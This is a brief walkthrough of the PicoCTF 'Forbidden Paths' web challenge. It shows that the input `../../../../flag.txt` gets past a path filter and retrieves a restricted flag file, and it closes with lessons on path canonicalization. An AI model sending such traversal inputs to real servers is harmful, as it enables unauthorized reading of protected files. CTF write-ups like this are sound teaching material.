# 🛡️ PicoCTF Lab Walkthrough – Forbidden Paths

## 📌 Challenge Info

* **Category**: Web Exploitation
* **Difficulty**: Easy

---

## 📝 Challenge Description

Bypass path filtering to retrieve restricted file `/flag.txt`.

---

## 🔍 Initial Recon

* **Files provided**: None
* **Services/Ports**: Web app file fetcher
* **Hints given**: Path traversal suspected

---

## 🛠️ Tools & Commands Used

| Tool / Command         | Purpose                |
| ---------------------- | ---------------------- |
| `../../../../flag.txt` | Path traversal attempt |

---

## 🧠 Step-by-Step Solution

1. Entered input:

   ```
   ../../../../flag.txt  
   ```
2. Successfully bypassed filter.
3. Retrieved `/flag.txt` from server.

---

## 🧾 Flag

picoCTF{\[flag\]}

---

## 📚 Learning Outcomes

* Path traversal exploits weak input validation.
* Filters must canonicalize paths to avoid bypasses.
